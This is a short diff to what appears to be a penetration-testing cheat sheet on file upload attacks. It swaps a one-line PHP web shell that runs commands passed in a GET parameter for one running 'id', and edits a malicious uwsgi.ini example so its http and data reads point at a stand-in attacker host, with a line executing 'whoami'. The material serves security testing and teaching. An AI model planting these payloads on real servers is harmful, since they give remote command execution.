@@ -162,7 +162,7 @@ PHP web shells don't always have the `<?php` tag, here are some alternatives:
 * The `<?=` is shorthand syntax in PHP for outputting values. It is equivalent to using `<?php echo`.
 
     ```php
-    <?=`$_GET[0]`?>
+    <?=`id`?>
     ```
 
 ### Filename Vulnerabilities
@@ -244,11 +244,11 @@ Example of a malicious `uwsgi.ini` file:
 ; read from a symbol
 foo = @(sym://uwsgi_funny_function)
 ; read from binary appended data
-bar = @(data://[REDACTED])
+bar = @(data://[ATTACKER.DOMAIN.TLD])
 ; read from http
-test = @(http://[REDACTED])
+test = @(http://[ATTACKER.DOMAIN.TLD])
 ; read from a file descriptor
-content = @(fd://[REDACTED])
+content = @(fd://[ATTACKER.DOMAIN.TLD])
 ; read from a process stdout
 body = @(exec://whoami)
 ; call a function returning a char *
